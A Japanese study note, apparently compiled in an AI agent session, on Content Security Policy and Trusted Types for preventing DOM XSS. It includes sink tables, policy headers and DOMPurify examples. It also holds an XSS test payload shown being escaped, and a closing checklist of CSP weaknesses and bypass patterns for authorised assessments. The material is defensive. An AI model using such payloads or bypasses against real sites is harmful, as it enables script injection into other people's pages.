- 開発者とセキュリティエンジニアは**コードレビューとセキュリティ監査でこうしたパターンに特に注意を払うべき**。詳細は CSP プレゼンテーション（https://static.sched.com/hosted_files/locomocosec2019/db/CSP%20-%20A%20Successful%20Mess%20Between%20Hardening%20and%20Mitigation%20%281%29.pdf#page=27 ）。
- **Trusted Types は strict CSP を非常によく補完し、上に挙げた制約の一部を効率的に守れる。**

### 3.7 Further reading（原文逐語）

- [CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy](https://research.google/pubs/pub45542/)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [LocoMoco Conference: Content Security Policy - A successful mess between hardening and mitigation](https://static.sched.com/hosted_files/locomocosec2019/db/CSP%20-%20A%20Successful%20Mess%20Between%20Hardening%20and%20Mitigation%20%281%29.pdf)
- [Google I/O talk: Securing Web Apps with Modern Platform Features](https://webappsec.dev/assets/pub/Google_IO-Securing_Web_Apps_with_Modern_Platform_Features.pdf)

---

# 第4部（補助資料）: require-trusted-types-for と Trusted Types （出典: https://web.dev/trusted-types/）

原稿メタデータ: `title: Prevent DOM-based cross-site scripting vulnerabilities with Trusted Types` / `authors: koto` / `date: 2020-03-25`

### 4.1 なぜ重要か

- **DOM-based XSS（DOM XSS）は最も一般的な Web セキュリティ脆弱性の1つ**で、アプリに持ち込むのが非常に容易。Trusted Types（https://github.com/w3c/webappsec-trusted-types ）は、**危険な Web API 関数を secure by default にすることで**、DOM XSS 脆弱性のないアプリを書き・セキュリティレビューし・保守するためのツールを提供する。**Trusted Types は Chrome 83 でサポート**され、他ブラウザ向けに polyfill が用意されている。
- 用語（原文 key-term）: **DOM-based XSS は、ユーザーが制御する *source*（ユーザー名や URL フラグメントから取ったリダイレクト URL など）のデータが、任意の JavaScript コードを実行できる *sink*（`eval()` のような関数や `.innerHTML` のようなプロパティセッタ）に到達したときに起きる。**

### 4.2 Background

- XSS には2つの明確なグループがある。**サーバーサイドのコードが Web サイトを形成する HTML を安全でない方法で作ることに起因するもの**と、**クライアント側に根本原因があり、JavaScript コードがユーザー制御のコンテンツで危険な関数を呼ぶもの**。
- サーバーサイド XSS を防ぐには、**文字列連結で HTML を生成せず、安全な contextual-autoescaping テンプレートライブラリを使う**。バグは必ず起きるので、追加の緩和として **nonce ベース CSP**（https://csp.withgoogle.com/docs/strict-csp.html ）を使う。
- クライアントサイド（DOM ベース）XSS はブラウザも Trusted Types で防止を助けられるようになった。

### 4.3 API introduction — Trusted Types がロックダウンする sink 一覧（表として完全再現）

Trusted Types は以下の**リスクのある sink 関数**をロックダウンすることで機能する。ブラウザベンダや Web フレームワークがすでにセキュリティ上の理由で使用を避けるよう誘導しているものもある。

| カテゴリ | sink（原文逐語） |
|---|---|
| **Script manipulation** | `<script src>`、および `<script>` 要素の text content の設定 |
| **Generating HTML from a string** | `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `<iframe> srcdoc`, `document.write`, `document.writeln`, `DOMParser.parseFromString` |
| **Executing plugin content** | `<embed src>`, `<object data>`, `<object codebase>` |
| **Runtime JavaScript code compilation** | `eval`, `setTimeout`, `setInterval`, `new Function()` |

- Trusted Types は、上記 sink 関数に渡す前にデータを処理することを要求する。**単に文字列を使うと失敗する**（ブラウザはそのデータが信頼できるか分からないため）。

Trusted Types 有効時にブラウザが *TypeError* を投げ、文字列での DOM XSS sink 利用を防ぐ例（worse）:

```javascript
anElement.innerHTML  = location.href;
```

データが安全に処理されたことを示すには、特別なオブジェクト = Trusted Type を作る（better）:

```javascript
anElement.innerHTML = aTrustedHTML;
```

- Trusted Types 有効時、ブラウザは HTML スニペットを期待する sink に対して `TrustedHTML` オブジェクトを受け入れる。他の機密 sink 向けに **`TrustedScript`** と **`TrustedScriptURL`** オブジェクトもある。
- Trusted Types はアプリの DOM XSS **攻撃面を大幅に削減**する。セキュリティレビューを単純化し、コードのコンパイル・lint・バンドル時に行う型ベースのセキュリティチェックを**実行時にブラウザ内で強制**できるようにする。

### 4.4 Trusted Types の使い方（手順）

#### Prepare for Content Security Policy violation reports

- レポートコレクタ（オープンソースの **go-csp-collector**: https://github.com/jacobbednarz/go-csp-collector ）を展開するか、商用の同等品を使う。ブラウザ内で違反をデバッグすることもできる:

```js
document.addEventListener('securitypolicyviolation',
    console.error.bind(console));
```

#### Add a report-only CSP header

Trusted Types に移行したいドキュメントに次の HTTP レスポンスヘッダを追加する（**逐語**）:

```text
Content-Security-Policy-Report-Only: require-trusted-types-for 'script'; report-uri //my-csp-endpoint.example
```

- これで全違反が `//my-csp-endpoint.example` に報告されるが、Web サイトは動作し続ける。
- caution: **Trusted Types は HTTPS や `localhost` のような secure context でのみ利用可能。**

#### Identify Trusted Types violations

- これ以降、Trusted Types が違反を検知するたびに設定した `report-uri` にレポートが送られる。たとえばアプリが文字列を `innerHTML` に渡したとき、ブラウザは次のレポートを送る（**逐語**）:

```json
{
"csp-report": {
    "document-uri": "https://my.url.example",
    "violated-directive": "require-trusted-types-for",
    "disposition": "report",
    "blocked-uri": "trusted-types-sink",
    "line-number": 39,
    "column-number": 12,
    "source-file": "https://my.url.example/script.js",
    "status-code": 0,
    "script-sample": "Element innerHTML <img src=x"
}
}
```

- これは `https://my.url.example/script.js` の 39 行目で `innerHTML` が `<img src=x` で始まる文字列で呼ばれたことを示す。**この情報からコードのどの部分が DOM XSS を持ち込んでいて変更が必要かを絞り込める。**
- 補足（原文 Aside）: この種の違反のほとんどはコード linter や静的コードチェッカ（https://github.com/mozilla/eslint-plugin-no-unsanitized ）をコードベースに走らせても検出できる。これで大量の違反を素早く特定できる。**とはいえ、CSP 違反も分析すべき** — こちらは**非準拠コードが実行されたときにトリガーされる**ため。

#### Fix the violations（違反の修正 — 4つの選択肢）

**(1) Rewrite the offending code（問題のコードを書き換える）**

worse:

```javascript
el.innerHTML = '<img src=xyz.jpg>';
```

better:

```javascript
el.textContent = '';
const img = document.createElement('img');
img.src = 'xyz.jpg';
el.appendChild(img);
```

**(2) Use a library（ライブラリを使う）** — 一部のライブラリはすでに sink 関数に渡せる Trusted Types を生成する。たとえば **DOMPurify**（https://github.com/cure53/DOMPurify ）で HTML スニペットをサニタイズして XSS ペイロードを除去できる。

```javascript
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(html, {RETURN_TRUSTED_TYPE: true});
```

- DOMPurify は Trusted Types をサポートし、サニタイズ済み HTML を `TrustedHTML` オブジェクトにラップして返すのでブラウザは違反を生成しない。
- caution: **DOMPurify のサニタイズロジックにバグがあれば、アプリには依然 DOM XSS 脆弱性がありうる。** Trusted Types は値を*何らかの方法で*処理することを強制するが、**正確な処理ルールが何であるべきか、それが安全かどうかはまだ定義していない。**

**(3) Create a Trusted Type policy（Trusted Type ポリシーを作る）** — 機能を削除できず、値をサニタイズして Trusted Type を作ってくれるライブラリもない場合は、自分で Trusted Type オブジェクトを作る。まず **policy** を作る。ポリシーは入力に一定のセキュリティルールを強制する Trusted Types のファクトリ。

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) { // Feature testing
  const escapeHTMLPolicy = trustedTypes.createPolicy('myEscapePolicy', {
    createHTML: string => string.replace(/\</g, '&lt;')
  });
}
```

- このコードは `myEscapePolicy` という名のポリシーを作り、その `createHTML()` 関数で `TrustedHTML` オブジェクトを生成できるようにする。定義されたルールは `<` 文字を HTML エスケープして新しい HTML 要素の生成を防ぐ。

使い方:

```javascript
const escaped = escapeHTMLPolicy.createHTML('<img src=x onerror=alert(1)>');
console.log(escaped instanceof TrustedHTML);  // true
el.innerHTML = escaped;  // '&lt;img src=x onerror=alert(1)>'
```

- `trustedTypes.createPolicy()` に `createHTML()` として渡す JavaScript 関数は文字列を返すが、`createPolicy()` は**戻り値を正しい型（ここでは `TrustedHTML`）にラップするポリシーオブジェクト**を返す。

**(4) Use a default policy（デフォルトポリシーを使う）** — 問題のコードを変更できない場合（例: CDN から第三者ライブラリを読み込んでいる場合）は default policy を使う。

```javascript
if (window.trustedTypes && trustedTypes.createPolicy) { // Feature testing
  trustedTypes.createPolicy('default', {
    createHTML: (string, sink) => DOMPurify.sanitize(string, {RETURN_TRUSTED_TYPE: true})
  });
}
```

- **`default` という名のポリシーは、Trusted Type のみを受け付ける sink に文字列が使われたあらゆる箇所で使われる。**
- gotcha: **default policy は控えめに使い、通常のポリシーを使うようアプリをリファクタリングする方を優先する。** そうすることで、セキュリティルールがそれが処理するデータの近くにある設計（値を正しくサニタイズするための文脈が最も多く得られる設計）が促される。

#### Switch to enforcing Content Security Policy

アプリが違反を生成しなくなったら Trusted Types の強制を開始できる（**逐語**）:

```text
Content-Security-Policy: require-trusted-types-for 'script'; report-uri //my-csp-endpoint.example
```

- これで、**Web アプリがどれほど複雑でも、DOM XSS 脆弱性を持ち込みうるのはポリシーの1つの中のコードだけ**になる。そしてポリシー作成を制限（https://w3c.github.io/trusted-types/dist/spec//#trusted-types-csp-directive ）することでさらにロックダウンできる。

### 4.5 Further reading（原文逐語）

- [Trusted Types GitHub](https://github.com/w3c/webappsec-trusted-types)
- [W3C specification draft](https://w3c.github.io/trusted-types/dist/spec/)
- [FAQ](https://github.com/w3c/webappsec-trusted-types/wiki/FAQ)
- [Integrations](https://github.com/w3c/webappsec-trusted-types/wiki/Integrations)

---

## 診断・バグバウンティ観点での整理（許可された検証・診断目的）

〔補足（一般知識）〕以下は上記4本の原典から得られた事実を「CSP の評価手順」として再構成したもの。新しい事実の追加ではなく、原典の記述の並べ替えである。

1. **ヘッダを確認する**: `Content-Security-Policy` か `Content-Security-Policy-Report-Only` か（後者は強制されないので XSS 緩和として数えない）。`<meta>` 配信の場合は `frame-ancestors` / `sandbox` / レポート系が効かない（OWASP・web.dev 両方が明記）。
2. **`script-src`（なければ `default-src`）を見る**: `'unsafe-inline'` があれば（かつ nonce/hash がなければ）インライン注入で即実行可能。`'unsafe-eval'` があれば `eval()` / `setTimeout(string)` / `new Function()` 経路が開く。
3. **nonce/hash の有無と品質**: nonce がレスポンスごとに変わっているか（同一値が再利用されていれば XSS 緩和として無価値 — 原文「must be regenerated for every page request and they must be unguessable」）。nonce が推測可能な長さ・生成方法でないか（推奨は暗号学的強度 128bit 以上・Base64）。
4. **許可リスト型かどうか**: ホスト名列挙型の CSP は「ほとんどの構成でバイパス可能」（Google 論文 pub45542）。`csp-evaluator.withgoogle.com` や Lighthouse Best Practices で評価する（web.dev が明示的に推奨するツール）。
5. **`object-src` と `base-uri`**: strict CSP の必須2点。`object-src` 未制限ならプラグイン経由、`base-uri` 未制限なら `<base>` 注入で相対 URL スクリプトの読み込み先を奪える。両者は `default-src` にフォールバック**しない**ものがある（`base-uri` は web.dev の non-fallback リストに含まれる）。
6. **`form-action` / `frame-ancestors`**: フィッシングフォーム注入とクリックジャッキング/xs-leaks の防御。どちらも `default-src` にフォールバックしないので、設定していなければ「何でも許す」。
7. **`strict-dynamic` の有無**: あれば動的に作られたスクリプトが信頼される → 逆に `document.createElement('script')` の `src` に注入できる箇所（jQuery `.html()`、jQuery<3.0 の `.get()`/`.post()` など）が残っていれば strict CSP でも実行に至る（strict-csp の Limitations 節）。
8. **`require-trusted-types-for 'script'` の有無**: これがなければ DOM XSS sink（`innerHTML` 等の表を参照）は素の文字列を受け付ける。あっても `default` ポリシーが雑な処理をしていればバイパスの余地がある（Trusted Types 記事の caution）。
9. **ディレクティブの重複**: 同じディレクティブを2回書くと**2つ目は無視される**（web.dev）。ポリシー文字列の見た目と実効値がずれる典型パターン。
10. **各ディレクティブは `default-src` を完全に上書きする**（web.dev use case #3 の注記）。`default-src https:` があっても `script-src` を別に書けばそこに `https:` は継承されない。

---

## 読者が自分で開くべき資料

このノートの担当2URLは、いずれも**本セッションのネットワーク egress ポリシーで直接アクセスできなかった**（`gateway answered 403 to CONNECT`）。内容は GitHub 上の原稿 Markdown から全量取得したが、読者は自分の環境で必ず原典を開くこと。とくに以下を読むべき。

### https://web.dev/articles/csp （取得不可の理由: egress プロキシが `web.dev:443` への CONNECT を 403 で拒否。web.archive.org も同様に拒否されたためスナップショット代替も不可。内容は `GoogleChrome/web.dev` リポジトリの `src/site/content/en/blog/csp/index.md` から取得）

読みどころ:
1. **「Policy applies to a wide variety of resources」節のディレクティブ一覧** — ライブページは CSP Level 3 の現状に合わせて更新されている可能性がある（本ノートの一覧は原稿の Level 2 基準の記述）。`worker-src` や `frame-src` の実装状況の記述は特に古い可能性が高いので、ライブ版と MDN で最新状況を確認する。
2. **「Implementation details」節の source list 文法とワイルドカード規則** — `*://*.example.com:*` が `example.com` 自身にマッチしないこと、ホスト名のみの指定が任意スキーム・任意ポートにマッチすることは、CSP バイパス判定の核になる。
3. **「Inline code is considered harmful」節と nonce/hash の使い方** — `sha256-`/`sha384-`/`sha512-`、`<script>` タグを含めない、空白と大文字小文字が効くという3点。
4. **「Reporting」節の違反レポート JSON のキー構造** — `document-uri` / `referrer` / `blocked-uri` / `violated-directive` / `original-policy`。レポート収集基盤を作るときの最小スキーマ。
5. **3つの Use case（social media widgets / lockdown / SSL only）の完成ポリシー文字列** — 実務で最初に真似する雛形。特に use case #3 の「各ディレクティブは default を完全に上書きする」注記。
6. **ページに埋め込まれたコンソールエラーのスクリーンショット** — 実際の DevTools 出力の見た目（本ノートには alt テキストのみ記録した）。

### https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html （取得不可の理由: egress プロキシが `cheatsheetseries.owasp.org:443` への CONNECT を 403 で拒否。内容は `OWASP/CheatSheetSeries` リポジトリの `cheatsheets/Content_Security_Policy_Cheat_Sheet.md` から全量取得）

読みどころ:
1. **「Detailed CSP Directives」節の4分類（Fetch / Document / Navigation / Reporting）** — ディレクティブを分類で覚えるのが最も実務的。`script-src-elem` と `script-src-attr`、`style-src-elem` と `style-src-attr` の違いに注意。
2. **「Strict CSP」節と2つの推奨ポリシー（nonce-based / hash-based）** — 逐語で暗記してよい3行。`object-src 'none'` と `base-uri 'none'` を落とさないこと。
3. **nonce の Warning** — 「全 script タグを nonce 付きに置換するミドルウェアを作るな。攻撃者の注入スクリプトにも nonce が付く」。これは実装レビューで最も多く見る致命的アンチパターン。
4. **hash の Note** — 空白1文字の変更でもハッシュが変わりスクリプトが動かなくなる運用リスク。
5. **`report-to` と `report-uri` の関係** — `report-to` が現行の主要ディレクティブで `Reporting-Endpoints`（レガシーは `Report-To`）ヘッダのグループ名を参照する。後方互換のため両方書く。
6. **References 節のツール類** — CSP Evaluator（csp-evaluator.withgoogle.com）、report-uri.com の hash generator、CSP Generator 拡張。診断作業で実際に使う。
7. **このページは GitHub 上で更新が続いている** — `prefetch-src` が CSP Level 3 から削除された旨の記述のように、記述は随時更新される。最新版は必ずライブページか master ブランチの Markdown で確認する。

### 補助的に読むべき資料（本ノート第3部・第4部の出典。いずれも担当2URLが明示的に参照している）

- **https://web.dev/strict-csp/** — strict CSP 導入の5ステップ、Express の nonce 生成コード、Safari/古いブラウザ向けフォールバック（`https:` と `'unsafe-inline'`）、そして **Limitations 節**（strict CSP でも守れない5パターン）。診断者はこの Limitations を暗記すべき。
- **https://web.dev/trusted-types/** — `require-trusted-types-for 'script'` の展開手順と **DOM XSS sink の完全表**。ch03（DOM XSS）の source/sink 表の原典として使える。
- **https://research.google/pubs/pub45542/**（"CSP Is Dead, Long Live CSP!"）— 許可リスト型 CSP がほとんどの構成でバイパス可能であることの実証データ。
- **https://csp-evaluator.withgoogle.com/** — ポリシー文字列を貼るだけで弱点を指摘するツール。
- **https://www.w3.org/TR/CSP3/** および **https://w3c.github.io/webappsec-csp/#strict-dynamic-usage** — `strict-dynamic` の正式な挙動、および https://www.w3.org/TR/CSP3/#directive-fallback-list（フォールバックリスト）。
- **https://strict-csp-codelab.glitch.me/csp_sha256_util.html** — インラインスクリプトの SHA-256 ハッシュ計算ツール（web.dev/strict-csp が案内しているもの）。
